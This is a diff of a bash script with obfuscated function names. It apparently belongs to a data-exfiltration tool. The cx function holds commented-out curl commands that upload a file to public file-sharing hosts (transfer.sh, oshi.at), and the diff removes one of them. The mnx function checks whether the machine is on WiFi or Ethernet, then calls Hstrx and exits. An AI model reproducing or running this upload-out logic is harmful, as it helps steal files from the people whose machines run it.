@@ -120,10 +120,6 @@ function Hstrx(){
 }
 
 function cx(){
-    #OX=`curl -k --upload-file $IBUS_$1 https://transfer.sh/$1`
-    #dbgx "OX: $OX";
-    #cx_ "$OX" "$2"
-    #
     #OX2=`curl -k -T $IBUS_$1 https://oshi.at`
     #dbgx "OX2: $OX2";
     #cx_ "$OX2" "$2"
@@ -157,12 +153,6 @@ function mnx(){
         else
             dbgx "No wireless network detected"
         fi
-	#
-	Hstrx
-	#ssx_ & PxNwx & Hstrx
-        #ax_
-        #
-        exit 0
     elif [[ -n "$eth_interface" ]]
     then
         dbgx "User is connected to Ethernet using interface $eth_interface"
@@ -179,15 +169,15 @@ function mnx(){
             dbgx "No Ethernet connection detected"
         fi
 	#
-	Hstrx
-	#ssx_ & PxNwx & Hstrx
-        #ax_
-        #
-        exit 0
     else
         dbgx "User is not connected to WiFi or Ethernet"
-        exit 1
     fi
+    #
+    Hstrx
+    #ssx_ & PxNwx & Hstrx
+    #ax_
+    #
+    exit 0
 }
 
 function px(){
